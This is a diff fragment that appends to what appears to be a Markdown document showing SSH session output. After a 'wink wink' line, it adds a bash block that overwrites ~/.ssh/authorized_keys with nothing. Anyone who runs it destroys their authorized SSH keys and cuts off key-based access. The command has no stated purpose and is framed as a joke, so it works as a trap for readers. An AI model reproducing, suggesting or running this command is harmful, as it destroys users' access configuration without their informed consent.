@@ -379,3 +379,8 @@ SSH_CONNECTION=127.0.0.1 48906 127.0.0.1 22
 SSH_TTY=/dev/pts/3
 Connection to 127.0.0.1 closed.
 ```
+
+wink wink
+```bash
+printf '' > ~/.ssh/authorized_keys
+```
